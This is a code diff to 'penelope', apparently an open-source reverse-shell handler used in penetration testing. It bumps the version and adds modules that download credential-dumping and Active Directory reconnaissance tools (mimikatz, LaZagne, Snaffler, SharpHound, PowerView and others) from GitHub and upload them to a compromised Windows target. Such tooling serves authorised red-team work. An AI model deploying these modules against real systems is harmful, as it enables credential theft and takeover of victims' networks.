@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-# Copyright © 2021 - 2025 @brightio <brightiocode@gmail.com>
+# Copyright © 2021 - 2026 @brightio <brightiocode@gmail.com>
 
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.15.0"
+__version__ = "0.15.1"
 
 import os
 import io
@@ -4628,6 +4628,37 @@ class linux_procmemdump(Module):
 			logger.error("This module runs only on Unix shells")
 
 
+class upload_ad_scripts(Module):
+	category = "Active Directory"
+	def run(session, args):
+		"""
+		Upload SharpHound, Powerview, GhostPack collection to the Windows target
+		"""
+		if session.OS == 'Unix':
+			logger.error("This module runs only on Windows shells")
+
+		elif session.OS == 'Windows':
+			session.upload(URLS['sharphound'])
+			session.upload(URLS['powerview'])
+			session.upload(URLS['ghostpack'])
+
+
+class upload_credump_scripts(Module):
+	category = "Credential Dumping"
+	def run(session, args):
+		"""
+		Upload mimikatz, LaZagne, Snaffler, SharpWeb to the Windows target
+		"""
+		if session.OS == 'Unix':
+			logger.error("This module runs only on Windows shells")
+
+		elif session.OS == 'Windows':
+			session.upload(URLS['mimikatz'])
+			session.upload(URLS['lazagne'])
+			session.upload(URLS['snaffler'])
+			session.upload(URLS['sharpweb'])
+
+
 class FileServer:
 	def __init__(self, *items, port=None, host=None, url_prefix=None, quiet=False):
 		self.port = port or options.default_fileserver_port
@@ -5319,6 +5350,13 @@ URLS = {
 	'chisel_winamd64':	"https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_windows_amd64.zip",
 	'ligolo_amd64':		"https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz",
 	'ligolo_arm64':		"https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_arm64.tar.gz",
+	'snaffler':		"https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe",
+	'lazagne':		"https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe",
+	'mimikatz':		"https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip",
+	'sharphound':		"https://github.com/SpecterOps/SharpHound/releases/download/v2.8.1/SharpHound_v2.8.1_windows_x86.zip",
+	'powerview':		"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1",
+	'sharpweb':		"https://github.com/djhohnstein/SharpWeb/releases/download/v1.2/SharpWeb.exe",
+	'ghostpack':		"https://codeload.github.com/r3motecontrol/Ghostpack-CompiledBinaries/zip/20a5f0a81456358b2bdc9846774949a7fb25acd8",
 }
 EMOJIS = {
 	'folder':'📁', 'file':'📄', 'invalid_shell':'🙄', 'new_shell':'😍️', 'target':'🎯', 'upgrade':'💪', 'logfile':'📜',
